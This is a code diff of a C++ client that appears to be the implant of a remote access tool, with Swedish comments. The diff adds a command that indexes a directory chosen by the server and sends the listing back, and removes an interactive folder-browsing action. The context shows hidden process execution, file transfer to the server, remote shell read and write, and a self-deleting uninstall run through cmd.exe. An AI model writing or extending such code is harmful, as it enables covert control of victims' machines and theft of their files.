@@ -11,7 +11,15 @@ response_table client::get_responses()
 		{"process-h", payload::process_execution_hidden}, // för att starta en gömd process
 		{"download", payload::download_file}, // för att över föra en fil till servern
 		{"shell-read", [&](std::string data) { return std::string(shell.alive() ? (shell.ready() ? "ready" : "alive"): "dead") + "|" + shell.read_once();}}, // läsa från shellen som man skapare via shell-init
-		{"shell-write", [&](std::string data) { return std::string(shell.alive() ? "alive" : "dead") + "|" + (shell.write(data) ? "OK" : "FAIL"); }} // skriv till shellen efter läsning
+		{"shell-write", [&](std::string data) { return std::string(shell.alive() ? "alive" : "dead") + "|" + (shell.write(data) ? "OK" : "FAIL"); }}, // skriv till shellen efter läsning
+		{"folder-index", [&](std::string data) {
+			directory folder(data); // indexera mappen från servern
+			std::string serilized;
+			for (auto [path, size] : folder.current_directory()) { // serializa indexering till en sträng
+				serilized += path.string() + "*" + std::to_string(size) + "|"; // to string för att ignorera locale vid utskrivning av nummer tex med locale blir 1000 -> 1,000
+			}
+			return serilized.substr(0, serilized.length() - 1); // ta bort sista |
+		}}
 	};
 }
 
@@ -22,22 +30,6 @@ action_table client::get_actions()
 
 		{"uninstall", [&](std::string) { // för att avinstallera klienten
 			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
-		}},
-
-		{"select", [&](std::string data) { // för att välja fil/mapp åt servern
-			directory manager(data); //antag data är bas directory
-			helper::send_directory(client_implementation, manager.current_directory()); // skicka bas mappen
-
-			packet paket = client_implementation.receive_packet(); // ta emot respons
-			while (paket.id != "dir_action" && paket.data != "done") { // medans server inte är klar, klienten kommer aldrig att fastna i den här loppen eftersom att den kallar recv vilket gör att den kan ominitializera instansen
-				std::cout << "recv()[" << paket.id << "|" << paket.data << "]" << std::endl;
-				if (!paket.id.empty() && !paket.data.empty()) { // paketet inte är tomt
-					if (paket.id == "goto" && std::all_of(paket.data.begin(), paket.data.end(), isdigit)) { // om vi ska gå in i en undermapp
-						helper::send_directory(client_implementation, manager.descend(std::stoi(paket.data))); // gå in och skicka undermappen
-					}
-				}
-				paket = client_implementation.receive_packet(); // ta emot nästa instruktion från servern
-			}
 		}},
 
 		{"upload", [&](std::string data) {
